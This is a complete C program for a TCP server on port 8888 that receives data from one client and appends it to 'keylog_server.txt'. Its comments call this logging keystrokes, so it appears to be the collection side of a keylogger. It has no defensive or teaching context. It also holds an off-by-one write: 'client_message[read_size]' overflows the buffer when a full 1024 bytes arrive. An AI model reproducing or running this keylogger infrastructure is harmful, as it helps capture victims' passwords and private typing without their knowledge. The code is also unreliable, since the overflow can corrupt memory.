#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

int main() {
    int socket_desc, client_sock, c;
    struct sockaddr_in server, client;
    char client_message[BUFFER_SIZE];
    int read_size;

    // Create socket
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1) {
        printf("Could not create socket\n");
        return 1;
    }
    printf("Socket created\n");

    // Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(8888);

    // Bind
    if (bind(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Bind failed. Error");
        return 1;
    }
    printf("Bind done\n");

    // Listen
    listen(socket_desc, 3);

    // Accept incoming connection
    printf("Waiting for incoming connections...\n");
    c = sizeof(struct sockaddr_in);
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t *)&c);
    if (client_sock < 0) {
        perror("Accept failed");
        return 1;
    }
    printf("Connection accepted\n");

    // Open a file to log keystrokes
    FILE *logFile = fopen("keylog_server.txt", "a");
    if (logFile == NULL) {
        perror("Could not open log file");
        return 1;
    }

    // Receive data from client
    while ((read_size = recv(client_sock, client_message, BUFFER_SIZE, 0)) > 0) {
        // Null-terminate the string received
        client_message[read_size] = '\0';
        
        // Print to console
        printf("%s", client_message);

        // Write to the log file
        fprintf(logFile, "%s", client_message);
        fflush(logFile);  // Ensure it's written to the file
    }

    if (read_size == 0) {
        printf("Client disconnected\n");
    } else if (read_size == -1) {
        perror("Receive failed");
    }

    // Close the file and socket
    fclose(logFile);
    close(client_sock);
    close(socket_desc);

    return 0;
}
